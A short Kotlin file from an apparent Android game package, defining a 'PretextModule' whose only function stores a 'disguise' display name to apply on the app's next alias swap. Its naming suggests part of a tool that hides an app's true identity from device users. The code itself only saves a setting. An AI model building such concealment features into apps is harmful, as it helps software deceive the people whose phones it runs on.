package com.puzzleblast.game.modules

import android.content.Context
import com.puzzleblast.game.util.Prefs

object PretextModule {
    suspend fun setName(ctx: Context, name: String): String {
        Prefs.disguiseLabel = name
        return "🏷 display name set to $name (applies on next alias swap)"
    }
}
